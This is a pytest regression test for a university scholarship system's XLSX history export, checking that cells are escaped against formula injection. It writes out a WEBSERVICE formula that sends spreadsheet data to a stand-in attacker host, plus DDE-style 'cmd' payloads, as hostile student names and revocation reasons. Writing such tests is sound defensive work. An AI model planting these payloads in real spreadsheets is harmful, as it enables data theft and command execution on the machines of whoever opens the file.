"""Regression test for GET /api/v1/admin/applications/history/export (issue #1223 A).

The 歷史申請 XLSX export writes SIS-sourced 姓名/Email and staff free-text
(撤銷/停發/刪除原因) straight into openpyxl cells. openpyxl writes a string that
leads with ``=`` as a LIVE formula, so a payload such as
``=WEBSERVICE("https://attacker/x?d="&TEXTJOIN(",",TRUE,A:A))`` executes the moment
財務稽核 opens the download and enables editing — exfiltrating the whole cohort.

The shared ``sanitize_excel_cell`` helper (added for #1081 finding G, and already
used by the college ranking / distribution / summary exports) was never applied to
THIS export. These tests pin that it now is.

Approach mirrors test_application_summary_export_endpoint.py: FastAPI TestClient
with dependency_overrides for require_admin + get_db against in-memory SQLite.
"""

from __future__ import annotations

import os
from datetime import datetime, timezone
from io import BytesIO

# Ensure test mode before any app import
os.environ.setdefault("TESTING", "true")
os.environ.setdefault("PYTEST_CURRENT_TEST", "true")

from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine  # noqa: E402
from sqlalchemy.pool import StaticPool  # noqa: E402

from app.core.config import settings  # noqa: E402

_TEST_SYNC = "sqlite:///:memory:"
_TEST_ASYNC = "sqlite+aiosqlite:///:memory:"
settings.database_url_sync = _TEST_SYNC
settings.database_url = _TEST_ASYNC

from fastapi.testclient import TestClient  # noqa: E402
from openpyxl import load_workbook  # noqa: E402

from app.core.security import require_admin  # noqa: E402
from app.db.base_class import Base  # noqa: E402
from app.db.deps import get_db  # noqa: E402
from app.main import app  # noqa: E402
from app.models.application import Application, ApplicationStatus  # noqa: E402
from app.models.enums import Semester, SubTypeSelectionMode  # noqa: E402
from app.models.scholarship import ScholarshipType  # noqa: E402
from app.models.user import EmployeeStatus, User, UserRole, UserType  # noqa: E402

EXPORT_URL = "/api/v1/admin/applications/history/export"

# A real, working exfiltration payload — not a toy "=1+1".
EXFIL_PAYLOAD = '=WEBSERVICE("https://attacker.example/x?d="&TEXTJOIN(",",TRUE,A:A))'

_async_engine = create_async_engine(
    _TEST_ASYNC,
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)
_AsyncSession = async_sessionmaker(_async_engine, class_=AsyncSession, expire_on_commit=False)


def _run_async(coro):
    import asyncio

    return asyncio.run(coro)


def _create_tables():
    async def _impl():
        async with _async_engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)

    _run_async(_impl())


def _drop_tables():
    async def _impl():
        async with _async_engine.begin() as conn:
            await conn.run_sync(Base.metadata.drop_all)

    _run_async(_impl())


def _make_admin_user() -> User:
    return User(
        id=9101,
        nycu_id="admin_hist_export",
        name="History Export Admin",
        email="admin_hist@test.nycu.edu.tw",
        user_type=UserType.employee,
        status=EmployeeStatus.active,
        role=UserRole.admin,
    )


class TestHistoryExportFormulaInjection:
    def setup_method(self):
        _create_tables()

    def teardown_method(self):
        _drop_tables()
        app.dependency_overrides.clear()

    def _client(self) -> TestClient:
        async def _fake_db():
            async with _AsyncSession() as session:
                yield session

        app.dependency_overrides[get_db] = _fake_db
        app.dependency_overrides[require_admin] = _make_admin_user
        return TestClient(app, raise_server_exceptions=True)

    def _seed(self, *, student_name: str, revoke_reason: str) -> None:
        """Seed one student + scholarship + application carrying hostile text."""

        async def _impl():
            async with _AsyncSession() as session:
                session.add(
                    User(
                        id=7001,
                        nycu_id="310460031",
                        name=student_name,
                        email="victim@test.nycu.edu.tw",
                        user_type=UserType.student,
                        status=EmployeeStatus.student,
                        role=UserRole.student,
                    )
                )
                session.add(
                    ScholarshipType(
                        id=1,
                        code="phd_nstc",
                        name="博士生獎學金",
                    )
                )
                session.add(
                    Application(
                        id=3001,
                        app_id="APP-114-1-00001",
                        user_id=7001,
                        scholarship_type_id=1,
                        status=ApplicationStatus.approved,
                        academic_year=114,
                        semester=Semester.first,
                        sub_type_selection_mode=SubTypeSelectionMode.single,
                        is_renewal=False,
                        revoke_reason=revoke_reason,
                        created_at=datetime(2026, 7, 1, tzinfo=timezone.utc),
                    )
                )
                await session.commit()

        _run_async(_impl())

    def _export_rows(self):
        resp = self._client().get(EXPORT_URL)
        assert resp.status_code == 200, resp.text
        wb = load_workbook(BytesIO(resp.content))
        ws = wb.active
        return list(ws.iter_rows(values_only=True))

    def test_hostile_student_name_is_not_written_as_a_live_formula(self):
        self._seed(student_name=EXFIL_PAYLOAD, revoke_reason="normal reason")
        rows = self._export_rows()

        data_row = rows[1]
        name_cell = data_row[1]  # column 2 = 學生姓名

        # The apostrophe prefix is what forces the cell to literal text.
        assert name_cell == "'" + EXFIL_PAYLOAD
        # The decisive assertion: no exported cell may still LEAD with a
        # formula trigger, which is what makes Excel/LibreOffice evaluate it.
        assert not name_cell.startswith("=")

    def test_hostile_staff_free_text_reason_is_neutralized(self):
        self._seed(student_name="王小明", revoke_reason="=cmd|'/c calc'!A1")
        rows = self._export_rows()

        reason_cell = rows[1][14]  # column 15 = 撤銷原因
        assert reason_cell == "'=cmd|'/c calc'!A1"
        assert not reason_cell.startswith("=")

    def test_no_exported_cell_leads_with_a_formula_trigger(self):
        """Sweep every cell — catches any column the fix missed."""
        self._seed(student_name=EXFIL_PAYLOAD, revoke_reason="-2+3+cmd|' /C calc'!A0")
        rows = self._export_rows()

        triggers = ("=", "+", "@", "\t", "\r")
        for row in rows:
            for cell in row:
                if isinstance(cell, str) and cell:
                    assert not cell.startswith(triggers), f"unsanitized cell: {cell!r}"

    def test_benign_export_is_unchanged(self):
        """Normal data must round-trip byte-identically — no stray apostrophes."""
        self._seed(student_name="王小明", revoke_reason="資格不符")
        rows = self._export_rows()

        data_row = rows[1]
        assert data_row[0] == "APP-114-1-00001"
        assert data_row[1] == "王小明"
        assert data_row[2] == "310460031"
        assert data_row[14] == "資格不符"
        # 學年 must stay a NUMBER, not become text — sanitize_excel_cell only
        # touches str values.
        assert data_row[7] == 114
        assert isinstance(data_row[7], int)
